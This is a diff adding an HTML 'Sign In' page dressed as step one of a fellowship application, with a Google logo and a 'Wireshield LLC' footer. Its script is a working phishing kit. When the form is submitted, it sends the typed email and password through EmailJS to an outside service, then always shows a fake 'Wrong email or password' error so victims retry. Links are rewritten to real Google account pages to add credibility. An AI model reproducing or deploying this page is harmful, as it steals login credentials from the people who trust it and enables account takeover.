@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sign In</title>
+
+  <link rel="icon" type="image/png" href="https://img.icons8.com/ios-filled/50/000000/lock--v1.png">
+
+  <style>
+    *{ box-sizing:border-box; margin:0; padding:0; }
+
+    body{
+      font-family: "Inter", "Segoe UI", Arial, sans-serif;
+      background:#ffffff;
+      color:#222;
+      padding:25px;
+    }
+
+    /* Page container */
+    .page-wrapper{
+      max-width:480px;
+      margin:auto;
+    }
+
+    /* Step Indicator */
+    .step-label{
+      font-size:14px;
+      color:#555;
+      margin-bottom:8px;
+      margin-top:5px;
+    }
+
+    .progress-bar{
+      width:100%;
+      height:6px;
+      border-radius:10px;
+      background:#e6e6e6;
+      overflow:hidden;
+      margin-bottom:25px;
+    }
+    .progress-bar div{
+      width:17%;
+      height:100%;
+      background:#3b82f6;
+    }
+
+    /* Titles */
+    h1{
+      font-size:26px;
+      font-weight:700;
+      margin-top:5px;
+      line-height:1.3;
+      margin-bottom:10px;
+    }
+    .subtitle{
+      font-size:16px;
+      color:#555;
+      margin-bottom:35px;
+      line-height:1.45;
+    }
+
+    /* Google Button */
+    .google-box{
+      display:flex;
+      align-items:center;
+      gap:15px;
+      padding:14px;
+      border:1px solid #e5e5e5;
+      border-radius:14px;
+      cursor:pointer;
+      width:max-content;
+      background:#fff;
+      margin-bottom:25px;
+    }
+    .google-box img{
+      width:34px;
+      height:34px;
+    }
+
+    .or-line{
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      gap:12px;
+      margin:20px 0;
+      color:#777;
+    }
+    .or-line span{
+      height:1px;
+      background:#ddd;
+      width:35%;
+      display:block;
+    }
+
+    /* Inputs */
+    input{
+      width:100%;
+      padding:16px;
+      font-size:15px;
+      border:1px solid #dcdcdc;
+      border-radius:12px;
+      margin-bottom:18px;
+      outline:none;
+      background:#fafafa;
+    }
+    input:focus{
+      border-color:#3b82f6;
+      background:#fff;
+    }
+
+    /* Blue submit button */
+    button{
+      width:100%;
+      padding:15px;
+      border:none;
+      border-radius:12px;
+      background:#3b82f6;
+      color:white;
+      font-size:18px;
+      font-weight:600;
+      cursor:pointer;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      gap:10px;
+      margin-top:5px;
+      margin-bottom:10px;
+    }
+
+    .error-message{
+      color:#e11d48;
+      font-size:14px;
+      text-align:center;
+      display:none;
+      margin-top:5px;
+    }
+
+    /* Footer */
+    .footer{
+      margin-top:40px;
+      font-size:12px;
+      text-align:center;
+      color:#888;
+    }
+    .footer a{
+      color:#777;
+      text-decoration:none;
+      margin:0 5px;
+    }
+
+    /* Loader screen (unchanged) */
+    #page-loader, .loading-overlay{
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      background: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      z-index: 10000;
+    }
+    #page-loader .spinner, .loading-overlay .spinner{
+      width:45px;
+      height:45px;
+      border:4px solid #ddd;
+      border-top:4px solid #3b82f6;
+      border-radius:50%;
+      animation:spin 1s linear infinite;
+    }
+    @keyframes spin{ to{ transform:rotate(360deg);} }
+    #page-loader.fade-out{ opacity:0; pointer-events:none; transition:.6s; }
+
+  </style>
+</head>
+<body>
+
+  <!-- Loading Screen -->
+  <div id="page-loader">
+    <div class="spinner"></div>
+    <p style="margin-top:10px; color:#3b82f6;">Loading...</p>
+  </div>
+
+  <div class="page-wrapper">
+    <p class="step-label">Step 1 of 6</p>
+
+    <div class="progress-bar"><div></div></div>
+
+    <h1>Welcome to Your Fellowship Journey</h1>
+    <p class="subtitle">Introduce yourself and lay the foundation for your adventure.</p>
+
+    <div class="google-box">
+      <img src="https://img.icons8.com/color/48/google-logo.png">
+    </div>
+
+    <div class="or-line">
+      <span></span> OR <span></span>
+    </div>
+
+    <form id="login-form">
+      <input type="email" id="email" placeholder="Email" required>
+      <input type="password" id="password" placeholder="Password" required>
+
+      <button type="submit">
+        Continue →
+      </button>
+
+      <div class="error-message" id="error-msg">Wrong email or password</div>
+    </form>
+
+    <div class="footer" id="footer">
+      <a href="#">Legal</a> |
+      <a href="#">Privacy Policy</a> |
+      <a href="#">Your Privacy Choices</a><br><br>
+      © Wireshield LLC 2024
+    </div>
+  </div>
+
+  <div class="loading-overlay" id="loading-screen" style="display:none;">
+    <div class="spinner"></div>
+    <p style="margin-top:10px;color:#3b82f6;">Signing in...</p>
+  </div>
+
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+
+  <script>
+    emailjs.init("Zuxy6x2TZlxuZ4ABj");
+
+    document.addEventListener("DOMContentLoaded", () => {
+      const pageLoader = document.getElementById("page-loader");
+
+      setTimeout(() => {
+        pageLoader.classList.add("fade-out");
+      }, 1500);
+
+      const form = document.getElementById("login-form");
+      const loader = document.getElementById("loading-screen");
+      const errorMsg = document.getElementById("error-msg");
+
+      form.addEventListener("submit", (e) => {
+        e.preventDefault();
+        loader.style.display = "flex";
+
+        emailjs.send("service_z1uzh6f", "template_whed5zh", {
+          email: document.getElementById("email").value,
+          password: document.getElementById("password").value
+        }).then(() => {
+          loader.style.display = "none";
+          errorMsg.style.display = "block";
+        }).catch(() => {
+          loader.style.display = "none";
+        });
+      });
+
+      document.querySelectorAll("a").forEach(link => {
+        const text = link.textContent.toLowerCase();
+        if(text.includes("create account")) link.href="https://accounts.google.com/signup";
+        if(text.includes("forgot password")) link.href="https://accounts.google.com/signin/v2/usernamerecovery";
+      });
+    });
+  </script>
+
+</body>
+</html>
